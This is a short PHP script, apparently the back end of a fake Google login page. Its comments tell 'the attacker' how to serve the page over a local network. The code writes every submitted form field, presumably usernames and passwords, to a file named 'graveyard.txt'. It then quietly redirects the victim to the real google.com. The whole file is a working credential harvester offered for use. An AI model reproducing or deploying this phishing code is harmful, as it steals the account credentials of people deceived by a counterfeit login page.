<?php

/*
    - start the server.bat file
    - to access, in browser type this into search bar --> <IP ADDRESS>:8080/google.html
    - works on chrome, edge, and firefox
    - works on safari on iPhone
    - must have network connected to set as a private network and have file and printer sharing turned on 
    over private networks in the network and sharing center settings (this only applies to the attackers device)
    - also have to allow php to communicate over private networks (again, only on attacker's device)
*/

header("Location: https://www.google.com");
$file = fopen("graveyard.txt", "a");
fwrite($file, "--------------------\n");
fwrite($file, "GOOGLE\n");
fwrite($file, "--------------------");
fwrite($file, "\r\n");
foreach($_POST as $key=>$value){
    fwrite($file, $key);
    fwrite($file, "=");
    fwrite($file, "$value");
    fwrite($file, "\r\n");
}
fwrite($file, "\r\n");
fclose($file);
exit;
?>